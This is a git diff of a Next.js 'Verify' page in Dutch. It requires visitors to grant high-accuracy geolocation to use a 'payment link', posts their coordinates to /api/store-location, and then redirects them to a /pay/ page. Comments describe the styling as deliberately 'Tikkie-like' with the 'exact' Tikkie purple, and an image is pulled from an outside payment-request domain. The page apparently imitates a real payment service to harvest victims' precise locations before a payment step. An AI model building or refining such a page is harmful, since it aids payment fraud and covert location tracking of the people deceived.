@@ -1,4 +1,4 @@
-import { useEffect, useState } from 'react';
+import { useState } from 'react';
 
 export async function getServerSideProps({ params }) {
   return { props: { slug: params.slug } };
@@ -6,6 +6,7 @@ export async function getServerSideProps({ params }) {
 
 export default function Verify({ slug }) {
   const [error, setError] = useState(null);
+  const [loading, setLoading] = useState(false);
 
   const log = async (data) => {
     await fetch('/api/store-location', {
@@ -15,16 +16,9 @@ export default function Verify({ slug }) {
     });
   };
 
-  // Log direct dat bezoeker hier is
-  useEffect(() => {
-    log({
-      slug,
-      flow: 'verify',
-      event: 'visit',
-    });
-  }, []);
+  const handleLocation = () => {
+    setLoading(true);
 
-  const requestLocation = () => {
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
         await log({
@@ -36,6 +30,7 @@ export default function Verify({ slug }) {
           accuracy: pos.coords.accuracy,
         });
 
+        // ✅ direct doorsturen
         window.location.href = `/pay/${slug}?verified=1`;
       },
       async () => {
@@ -46,7 +41,8 @@ export default function Verify({ slug }) {
           denied: true,
         });
 
-        setError('Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.');
+        setError('Locatie is verplicht om verder te gaan.');
+        setLoading(false);
       },
       {
         enableHighAccuracy: true,
@@ -57,95 +53,99 @@ export default function Verify({ slug }) {
   };
 
   return (
-    <div style={styles.page}>
-      <div style={styles.circle}>
-        <img
-          src="http://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
-          alt="IJsje"
-          style={styles.image}
-        />
+    <>
+      <style>{`
+        html, body {
+          margin: 0;
+          padding: 0;
+          background: #4b4f83;
+          font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        .page {
+          min-height: 100vh;
+          background: #4b4f83;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: flex-start;
+          text-align: center;
+        }
+
+        .circle {
+          margin-top: 24px;
+          width: 200px;   /* 20% kleiner */
+          height: 200px;
+          border-radius: 50%;
+          background: #ffffff;
+          border: 12px solid #3e4272;
+          overflow: hidden;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+        }
+
+        .circle img {
+          width: 100%;
+          height: 100%;
+          object-fit: cover;
+        }
+
+        h1 {
+          color: #ffffff;
+          font-size: 28px;
+          margin: 24px 16px 8px;
+        }
+
+        p {
+          color: #d7d9ef;
+          font-size: 16px;
+          margin: 0 24px 24px;
+        }
+
+        button {
+          background: #ffffff;
+          color: #4b4f83;
+          border: none;
+          border-radius: 12px;
+          padding: 16px;
+          font-size: 16px;
+          width: calc(100% - 48px);
+          max-width: 360px;
+          box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+          cursor: pointer;
+        }
+
+        button:disabled {
+          opacity: 0.6;
+        }
+
+        .error {
+          margin-top: 16px;
+          color: #ffd6d6;
+        }
+      `}</style>
+
+      <div className="page">
+        <div className="circle">
+          <img
+            src="http://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
+            alt="Verificatie"
+          />
+        </div>
+
+        <h1>🇳🇱 Bevestig dat je uit Nederland komt</h1>
+
+        <p>
+          Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.
+        </p>
+
+        <button onClick={handleLocation} disabled={loading}>
+          {loading ? 'Even geduld…' : 'Bevestigen met locatie'}
+        </button>
+
+        {error && <div className="error">{error}</div>}
       </div>
-
-      <h1 style={styles.title}>
-        🇳🇱 Bevestig dat je uit Nederland komt
-      </h1>
-
-      <p style={styles.subtitle}>
-        Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.
-      </p>
-
-      <button onClick={requestLocation} style={styles.button}>
-        Bevestigen met locatie
-      </button>
-
-      {error && <p style={styles.error}>{error}</p>}
-    </div>
+    </>
   );
 }
-
-/* 🎨 STYLES — mobile first, Tikkie-achtig */
-const styles = {
-  page: {
-    minHeight: '100vh',
-    backgroundColor: '#4A4B7C', // exact Tikkie-achtig paars
-    display: 'flex',
-    flexDirection: 'column',
-    alignItems: 'center',
-    justifyContent: 'center',
-    textAlign: 'center',
-    padding: '1.5rem',
-    fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, sans-serif',
-  },
-
-  circle: {
-    width: '176px',   // 20% kleiner dan 220
-    height: '176px',
-    borderRadius: '50%',
-    backgroundColor: '#FFFFFF',
-    border: '8px solid #3E3F66',
-    display: 'flex',
-    alignItems: 'center',
-    justifyContent: 'center',
-    overflow: 'hidden',
-    marginBottom: '1.5rem',
-  },
-
-  image: {
-    width: '100%',
-    height: '100%',
-    objectFit: 'cover',
-  },
-
-  title: {
-    color: '#FFFFFF',
-    fontSize: '1.75rem',
-    fontWeight: 700,
-    marginBottom: '0.75rem',
-  },
-
-  subtitle: {
-    color: '#D8D9F0',
-    fontSize: '1rem',
-    maxWidth: '360px',
-    marginBottom: '1.5rem',
-  },
-
-  button: {
-    backgroundColor: '#FFFFFF',
-    color: '#4A4B7C',
-    border: 'none',
-    borderRadius: '10px',
-    padding: '0.9rem 1.4rem',
-    fontSize: '1rem',
-    fontWeight: 600,
-    cursor: 'pointer',
-    width: '100%',
-    maxWidth: '320px',
-  },
-
-  error: {
-    marginTop: '1rem',
-    color: '#FFD6D6',
-    fontSize: '0.9rem',
-  },
-};
